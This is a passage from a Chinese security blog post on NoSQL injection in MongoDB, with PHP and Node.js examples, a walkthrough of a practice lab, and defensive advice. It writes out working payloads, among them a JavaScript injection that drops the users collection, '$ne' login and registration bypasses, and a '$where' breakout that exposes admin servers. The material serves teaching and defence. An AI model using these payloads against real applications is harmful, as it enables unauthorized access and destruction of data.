+<p><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/yanshi-2.gif" alt="img"></p>
+<p>整个users collection都不见了。继续看数据流。</p>
+<table>
+<thead>
+<tr>
+<th align="left">位置</th>
+<th align="left">数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/http.png" alt="img"></td>
+<td align="left"><code>username=2&#39;&#125;);db.users.drop();db.user.find(&#123;&#39;username&#39;:&#39;2</code></td>
+</tr>
+<tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2018-01-27-14-33-24.png" alt="img"></td>
+<td align="left"><code>$cmd = new MongoDB\Driver\Command([  // build the &#39;distinct&#39; command  &#39;eval&#39;=&gt; &quot;db.users.distinct(&#39;username&#39;,&#123;&#39;username&#39;:username=2&#39;&#125;);    db.users.drop();db.user.find(&#123;&#39;username&#39;:&#39;2&#125;)&quot; ]); </code></td>
+</tr>
+<tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2018-01-27-15-48-05.png" alt="img"></td>
+<td align="left"><code>db.users.distinct(&#39;username&#39;,&#123;&#39;username&#39;:username=2&#39;&#125;); db.users.drop();db.user.find(&#123;&#39;username&#39;:&#39;2&#125;) </code></td>
+</tr>
+</tbody></table>
+<p>但我们也同时发现，构建这样的payload是有一定难度的，需要我们对MongoDB，JavaScript和业务都有足够的了解，这也是NoSQL注入的局限性。类似的操作还有mapReduce，那个更复杂一些,但原理类似，我就不再举例子了。</p>
+<p>至此，几种常见的NoSQL注入已经用PHP语言解释完了，那么对于和MongoDB天生般配的JavaScript有没有类似问题呢？</p>
+<h2 id="Node-js中的NoSQL注入"><a href="#Node-js中的NoSQL注入" class="headerlink" title="Node.js中的NoSQL注入"></a>Node.js中的NoSQL注入</h2><p>PHP是第一次写，到了JavaScript这里就到了我熟悉的领域了。我们继续看代码。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var express &#x3D; require(&#39;express&#39;);</span><br><span class="line">var mongoose &#x3D; require(&#39;mongoose&#39;);</span><br><span class="line">var bodyParser &#x3D; require(&#39;body-parser&#39;);</span><br><span class="line">mongoose.connect(&#39;mongodb:&#x2F;&#x2F;localhost&#x2F;test&#39;, &#123; useMongoClient: true &#125;);</span><br><span class="line">var UserSchema &#x3D; new mongoose.Schema(&#123;</span><br><span class="line">    name: String,</span><br><span class="line">    username: String,</span><br><span class="line">    password: String</span><br><span class="line">&#125;);</span><br><span class="line">var User &#x3D; mongoose.model(&#39;users&#39;, UserSchema);</span><br><span class="line">var app &#x3D; express();</span><br><span class="line">app.set(&#39;views&#39;, __dirname);</span><br><span class="line">app.set(&#39;view engine&#39;, &#39;jade&#39;);</span><br><span class="line"></span><br><span class="line">app.get(&#39;&#x2F;&#39;, function(req, res) &#123;</span><br><span class="line">    res.render(&#39;index&#39;, &#123;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.json()); </span><br><span class="line"></span><br><span class="line">app.post(&#39;&#x2F;&#39;, function(req, res) &#123;</span><br><span class="line">    console.log(req.body)</span><br><span class="line">    User.findOne(&#123;username: req.body.username, password: req.body.password&#125;, function (err, user) &#123;</span><br><span class="line">        console.log(user)</span><br><span class="line">        if (err) &#123;</span><br><span class="line">            return res.render(&#39;index&#39;, &#123;message: err.message&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (!user) &#123;</span><br><span class="line">            return res.render(&#39;index&#39;, &#123;message: &#39;Sorry!&#39;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return res.render(&#39;index&#39;, &#123;message: &#39;Welcome back &#39; + user.name + &#39;!!!&#39;&#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">var server &#x3D; app.listen(49090, function () &#123;</span><br><span class="line">    console.log(&#39;listening on port %d&#39;, server.address().port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>和PHP类似，构建这样的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST http:&#x2F;&#x2F;127.0.0.1:49090&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;,</span><br><span class="line">    &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注入成功登陆系统</p>
+<table>
+<thead>
+<tr>
+<th align="left">位置</th>
+<th align="left">数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2018-01-27-14-26-46.png" alt="img"></td>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2017-12-18-15-48-27.jpg" alt="img"></td>
+</tr>
+<tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/http.png" alt="img"></td>
+<td align="left"><code>&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;: null&#125;&#125;</code></td>
+</tr>
+<tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2018-01-27-17-27-03.png" alt="img"></td>
+<td align="left"><code>User.findOne(&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;: null&#125;&#125; , function (err, user) &#123;  // some code &#125;) </code></td>
+</tr>
+<tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2018-01-27-15-48-05.png" alt="img"></td>
+<td align="left"><code>db.users.findOne(&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;: null&#125;&#125;) </code></td>
+</tr>
+</tbody></table>
+<p>从例子可以看出JavaScript的注入方式和PHP的类似，剩下的注入形式和其他语言的实现方式我就不一一列举了，大家有兴趣去写写漏洞，既能了解漏洞产生原理也能在开发过程中避免类似问题。</p>
+<h2 id="NoSQL注入靶场"><a href="#NoSQL注入靶场" class="headerlink" title="NoSQL注入靶场"></a>NoSQL注入靶场</h2><p>为了让大家对NoSQL注入都有所了解，某运营小姐姐提议我写个靶场，当然因为这个靶场不只是NoSQL注入，还组合了很多好玩的且程序员容易忽略的点，我也受益匪浅，有兴趣的可以去试试。靶场在<a target="_blank" rel="noopener" href="https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035">破壳漏洞社区</a></p>
+<p>整个代码用我比较熟悉的node.js+angular2实现，模拟一个需要用工号验证注册的内部系统，注册后可以查看和管理服务器，我把其中和NoSQL注入相关的拿出来说一下。</p>
+<h3 id="工号注册绕过"><a href="#工号注册绕过" class="headerlink" title="工号注册绕过"></a>工号注册绕过</h3><p>来看用户注册部分的代码:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function create(userParam) &#123;</span><br><span class="line">    var deferred &#x3D; Q.defer();</span><br><span class="line">    console.log(&#39;userParam.jobnumber&#39;,userParam.jobnumber);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; validation</span><br><span class="line"></span><br><span class="line">    if(userParam.username &#x3D;&#x3D;&quot;admin&quot;)&#123;</span><br><span class="line"></span><br><span class="line">        deferred.reject(&#39;用户名 admin 不允许注册&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    db.jobNumbers.findOne(</span><br><span class="line">        &#123; jobNumber: userParam.jobnumber &#125;,</span><br><span class="line">        function (err, user) &#123;</span><br><span class="line">            if (err) deferred.reject(err.name + &#39;: &#39; + err.message);</span><br><span class="line"></span><br><span class="line">            console.log(&#39;user&#39;,user);</span><br><span class="line"></span><br><span class="line">            if (!user) &#123;</span><br><span class="line">                &#x2F;&#x2F; jobnumber already exists</span><br><span class="line">                deferred.reject(&#39;工号 &quot;&#39; + userParam.jobnumber + &#39;&quot;不存在&#39;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                const jobNumberArray&#x3D;[&#39;puokr001&#39;,&#39;puokr002&#39;,&#39;puokr003&#39;,&#39;puokr004&#39;,&#39;puokr005&#39;,</span><br><span class="line">                &#39;puokr006&#39;,&#39;puokr007&#39;,&#39;puokr008&#39;,&#39;puokr009&#39;,&#39;puokr010&#39;,&#39;puokr011&#39;,];</span><br><span class="line"></span><br><span class="line">                if(jobNumberArray.indexOf(userParam.jobnumber)&gt;&#x3D;0)&#123;</span><br><span class="line">                    deferred.reject(&#39;工号 &quot;&#39; + userParam.jobnumber + &#39;&quot;已被注册&#39;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                db.users.findOne(</span><br><span class="line">                    &#123; username: userParam.username &#125;,</span><br><span class="line">                    function (err, user) &#123;</span><br><span class="line">                        if (err) deferred.reject(err.name + &#39;: &#39; + err.message);</span><br><span class="line">            </span><br><span class="line">                        if (user) &#123;</span><br><span class="line">                            &#x2F;&#x2F; username already exists</span><br><span class="line">                            deferred.reject(&#39;用户名 &quot;&#39; + userParam.username + &#39;&quot; 已存在&#39;);</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            createUser();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    function createUser() &#123;</span><br><span class="line">        &#x2F;&#x2F; set user object to userParam without the cleartext password</span><br><span class="line">        var user &#x3D; _.omit(userParam, [&#39;password&#39;,&#39;jobnumber&#39;]);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; add hashed password to user object</span><br><span class="line">        user.hash &#x3D; bcrypt.hashSync(userParam.password, 10);</span><br><span class="line"></span><br><span class="line">        db.users.insert(</span><br><span class="line">            user,</span><br><span class="line">            function (err, doc) &#123;</span><br><span class="line">                if (err) deferred.reject(err.name + &#39;: &#39; + err.message);</span><br><span class="line"></span><br><span class="line">                deferred.resolve();</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        createOwnServer();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要问题在这段代码中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.jobNumbers.findOne(</span><br><span class="line">        &#123; jobNumber: userParam.jobnumber &#125;,</span><br><span class="line">        function (err, user) &#123;...&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>由于<code>userParam.jobnumber</code>没有做任何校验，我们直接构建payload绕过工号校验直接注册:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;:  &quot;test&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;111111&quot;,</span><br><span class="line">  &quot;jobnumber&quot;: &#123;&quot;$ne&quot;: null&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/nosqldemo1.gif" alt="img"></p>
+<p>注册后直接登录系统，即可看到服务器列表。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/nosqldemo2.gif" alt="img"></p>
+<h3 id="越权查看管理员服务器"><a href="#越权查看管理员服务器" class="headerlink" title="越权查看管理员服务器"></a>越权查看管理员服务器</h3><p>这是第二个注入点，在登录进去后的服务器列表页面中其实给了相应的提示:你负责的测试服务器都会在这里展示，生产服务器请联系管理员获取，也就是说我们是看不到管理员服务器的，但他们应该在数据库中。<br>在前端console中，我故意打出了这样的数据结构(console中直接打印出数据结构也是程序员经常疏忽的点):</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2018-01-07-15-41-38.jpg" alt="img"></p>
+<p>从中可以看出服务器的owner是以数组的形式存的。然后我们为了过滤掉admin服务器，只显示自己的和public服务器，用了<code>$where</code>语句，并使用JavaScript语句进行过滤，比较常见的过滤方式是判断字符串的indexOf。那么我们尝试闭合indexOf，构造payload，这一步确实要对MongoDB和JavaScript都比较了解才能做出。</p>
+<p>还是一脸懵逼吧，直接看代码吧</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getServers(username)&#123;</span><br><span class="line">    var deferred &#x3D; Q.defer();</span><br><span class="line">    db.servers.find(&#123; $where:&quot;function()&#123;return ((this.owners.indexOf(&#39;admin&#39;)&lt;0 &amp;&amp; this.owners.indexOf(&#39;&quot;+username+&quot;&#39;)&gt;&#x3D;0))|| this.owners.indexOf(&#39;public&#39;)&gt;&#x3D;0 &#125;&quot; &#125;).toArray(function (err, servers) &#123;</span><br><span class="line">        if (err) deferred.reject(err.name + &#39;: &#39; + err.message);</span><br><span class="line"></span><br><span class="line">        console.log(servers);</span><br><span class="line"></span><br><span class="line">        deferred.resolve(servers);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    return deferred.promise;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样的，username没有进行任何校验，看着代码构造payload，该闭合的闭合，保证JavaScript不报错还要和admin有关，构造条件让查询条件中包含admin且为真……好吧我承认有点难……</p>
+<p>payload:<code>&#39;)&gt;0|| this.owners.indexOf(&#39;admin</code>。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/nosqldemo3.gif" alt="img"></p>
+<p>本来我对大家发现这个注入点没报太大的希望，但是靶场上线一段时间后，”summ3rf”同学给了我这样的一个思路:</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;username&quot;:&quot;summ3rf)))&#125;);&#x2F;&#x2F;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这样就即全部闭合了前面的代码，又不用考虑闭合后面的代码，感谢”summ3rf”同学，如果你能看到这篇文章，可以联系我共同探讨注入姿势~</p>
+<p>靶场详细Writeup可关注“破壳漏洞社区”公众号回复“冲破云雾”</p>
+<h2 id="如何防止NoSQL注入"><a href="#如何防止NoSQL注入" class="headerlink" title="如何防止NoSQL注入"></a>如何防止NoSQL注入</h2><p>从注入原理上看NoSQL注入的防护也很简单，思路也和SQL注入类似，我们只需要控制输入，禁止使用危险的操作就可以基本避免NoSQL注入。<br>比如上面那个php例子</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$data &#x3D; array(</span><br><span class="line">       &#39;username&#39; &#x3D;&gt;  $_REQUEST[&#39;username&#39;],</span><br><span class="line">       &#39;password&#39; &#x3D;&gt;  $_REQUEST[&#39;password&#39;]</span><br><span class="line">  ); </span><br></pre></td></tr></table></figure>
+
+<p>通过参数过滤就可以避免。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$data &#x3D; array(</span><br><span class="line">        &#39;username&#39; &#x3D;&gt;  filter_var($_REQUEST[&#39;username&#39;]),</span><br><span class="line">        &#39;password&#39; &#x3D;&gt;  filter_var($_REQUEST[&#39;password&#39;])</span><br><span class="line">   ); </span><br></pre></td></tr></table></figure>
+
+<p>对于JavaScript注入，<code>$where</code> 和Commend方法能不用就尽量不要用了，如果必须用的话一定要限制输入或者把要执行的内容写成JavaScript function通过参数的方式传进去。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$manager &#x3D;  new MongoDB\Driver\Manager(&quot;mongodb:&#x2F;&#x2F;mongo:27017&quot;);</span><br><span class="line">$username &#x3D; $_REQUEST[&#39;username&#39;];</span><br><span class="line">$cmd &#x3D; new MongoDB\Driver\Command([</span><br><span class="line">  &#x2F;&#x2F; build the &#39;distinct&#39; command</span><br><span class="line">  &#39;eval&#39;&#x3D;&gt; &quot;function(username)&#123;db.users.distinct(&#39;username&#39;,&#123;&#39;username&#39;:&#39; + username + &#39;&#125;)&#125;&quot;,</span><br><span class="line">  &#39;args&#39; &#x3D;&gt; $username,</span><br><span class="line">]);</span><br><span class="line">$cursor &#x3D; $manager-&gt;executeCommand(&#39;test&#39;, $cmd)-&gt;toArray();</span><br><span class="line">var_dump($cursor);</span><br><span class="line">$doc_failed &#x3D; new DOMDocument();</span><br><span class="line">$doc_failed-&gt;loadHTMLFile(&quot;failed.html&quot;);</span><br><span class="line">$doc_succeed &#x3D; new DOMDocument();</span><br><span class="line">$doc_succeed-&gt;loadHTMLFile(&quot;succeed.html&quot;);</span><br><span class="line">if(count($cursor)&gt;0)&#123;</span><br><span class="line">    echo $doc_succeed-&gt;saveHTML();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo $doc_failed-&gt;saveHTML();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还有还有，不要轻易打开一些MongoDB相关的REST API，防止跨站请求伪造，给应用最小权限，不要存在未授权访问用户……(去年发生的MongoDB勒索事件还记忆犹新……)一份官方的<a target="_blank" rel="noopener" href="https://docs.mongodb.com/manual/administration/security-checklist/">security-checklist</a>提供给大家参考。</p>
+<h2 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h2><p>这篇文从代码层解释了一下NoSQL是如何形成的，还比较浅显，研究并没有结束，今后也许会研究如何稳定利用NoSQL注入，从驱动层解释NoSQL的合成，以及分享靶场搭建的脑洞和技术思路。感谢各位大牛、我的朋友们和<a target="_blank" rel="noopener" href="https://pockr.org/">破壳漏洞社区</a>对我的支持。</p>
+<p>示例代码和靶场代码均已上传至<a target="_blank" rel="noopener" href="https://github.com/bibotai/research_of_nosql_injection">Github</a>。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a target="_blank" rel="noopener" href="http://www.yunweipai.com/archives/14084.html">NoSQL注入的分析和缓解</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://zanon.io/posts/nosql-injection-in-mongodb">NoSQL Injection in MongoDB</a></p>
+<p>[3] <a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection">Testing for NoSQL injection</a></p>
+<p>[4] <a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/database/95314.html">一个有趣的实例让NoSQL注入不再神秘</a></p>
+<p>[5] <a target="_blank" rel="noopener" href="https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html">HACKING NODEJS AND MONGODB</a></p>
+<p>[6] <a target="_blank" rel="noopener" href="http://docs.php.net/manual/en/mongodb.security.script_injection.php">PHP Manaul for MongoDB: Script Injection Attacks</a></p>
+<p>[7] <a target="_blank" rel="noopener" href="https://www.research.ibm.com/haifa/Workshops/security2015/present/Aviv_NoSQL-NoInjection.pdf">No SQL! no injection? A talk on the state of NoSQL security</a></p>
+<p>[8] <a target="_blank" rel="noopener" href="https://github.com/youngyangyang04/NoSQLInjectionAttackDemo">GitHub:youngyangyang04/NoSQLInjectionAttackDemo</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">upload</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://upload.love/2021/04/20/NOSQL/">http://upload.love/2021/04/20/NOSQL/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://upload.love" target="_blank">upload</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/image/buu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/04/23/xpath%E6%B3%A8%E5%85%A5/"><img class="prev-cover" data-lazy-src="/image/buu.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">xpath注入</div></div></a></div><div class="next-post pull-right"><a href="/2021/04/18/BUUCTF-25/"><img class="next-cover" data-lazy-src="/image/buu.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">upload</div><div class="author-info__description">每天都要开心</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">196</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">136</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://tcyba.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tcyba" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2384372932@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我希望我以后每天都能开开心心！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E8%B5%B7%E5%9B%A0"><span class="toc-number">1.</span> <span class="toc-text">研究起因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E7%82%B9NoSQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text">一点NoSQL注入的概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NoSQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">3.</span> <span class="toc-text">NoSQL注入分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%B8%AD%E7%9A%84NoSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">PHP中的NoSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E8%A8%80%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.</span> <span class="toc-text">重言式注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NoSQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">NoSQL联合查询注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.</span> <span class="toc-text">JavaScript注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Node-js%E4%B8%AD%E7%9A%84NoSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">Node.js中的NoSQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NoSQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA"><span class="toc-number">6.</span> <span class="toc-text">NoSQL注入靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%8F%B7%E6%B3%A8%E5%86%8C%E7%BB%95%E8%BF%87"><span class="toc-number">6.1.</span> <span class="toc-text">工号注册绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E6%9F%A5%E7%9C%8B%E7%AE%A1%E7%90%86%E5%91%98%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">6.2.</span> <span class="toc-text">越权查看管理员服务器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2NoSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">如何防止NoSQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%BE%E5%B7%B4"><span class="toc-number">8.</span> <span class="toc-text">尾巴</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">9.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/11/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A14/" title="java代码审计4"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计4"/></a><div class="content"><a class="title" href="/2021/11/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A14/" title="java代码审计4">java代码审计4</a><time datetime="2021-11-08T08:49:09.000Z" title="发表于 2021-11-08 16:49:09">2021-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/05/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13/" title="java代码审计3"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计3"/></a><div class="content"><a class="title" href="/2021/11/05/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13/" title="java代码审计3">java代码审计3</a><time datetime="2021-11-05T02:37:46.000Z" title="发表于 2021-11-05 10:37:46">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/" title="java代码审计2"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计2"/></a><div class="content"><a class="title" href="/2021/11/01/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/" title="java代码审计2">java代码审计2</a><time datetime="2021-11-01T13:08:39.000Z" title="发表于 2021-11-01 21:08:39">2021-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" title="东华杯"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="东华杯"/></a><div class="content"><a class="title" href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" title="东华杯">东华杯</a><time datetime="2021-11-01T04:27:51.000Z" title="发表于 2021-11-01 12:27:51">2021-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/" title="java代码审计1"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计1"/></a><div class="content"><a class="title" href="/2021/10/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/" title="java代码审计1">java代码审计1</a><time datetime="2021-10-31T08:49:36.000Z" title="发表于 2021-10-31 16:49:36">2021-10-31</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/2.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By upload</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script 